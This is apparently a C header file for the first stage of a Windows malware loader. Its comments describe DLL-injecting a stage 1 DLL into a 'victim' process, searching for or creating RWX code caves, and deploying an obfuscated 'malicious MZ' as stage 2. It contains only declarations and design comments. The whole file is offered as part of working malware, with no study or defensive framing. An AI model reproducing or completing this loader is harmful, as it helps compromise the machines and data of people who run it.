#ifndef _INJECTOR_H_
#define _INJECTOR_H_

#include <windows.h>
#include <TlHelp32.h>
#include <stdbool.h>

/*
* This is my stage 0, it will DLL inject the stage 1 dll into a process specified by the config file that will unobfuscate and deploy the malware, stage 2
* Stage 1 will look for RWX code caves in the proces and if it will not find any, create one
*/

/*
* --------------------------
*     HELPER FUNCTIONS
* --------------------------
*/

/*
* Checking if file exists
* 
* Returns: true if exists
*/
bool file_exists(const char filename[]);

/*
* Checking if the dll file is in our folder
* 
* Returns: dll is in curret dir
*/
bool check_in_folder_of_dll();

/*
* If our default process isn't good enough for injection we'll try to search for a process that contains an RWX.
* If such process is not found, we will revert to our default process
* 
* Returns: the process handle of our victim
*/
HANDLE find_process();

/*
* Checking if a certain process has an RWX big enough to have the malware in it
* 
* Returns: true if process is good
*/
bool is_process_good(PROCESSENTRY32 processEntry);


/*
* This function is "main" function of the stage 0.
* First it will check if it's already deployed.
* Then it will check if the dll is in the malware's folder.
* If so it will check if the process has a big enough RWX to contain our malicious MZ.
* Lastly it will inject the stage 1 dll into the process, that will deploy our malware, stage 2
* 
* Returns: true if injected, false otherwise
*/
bool inject_dll_into_process();

#endif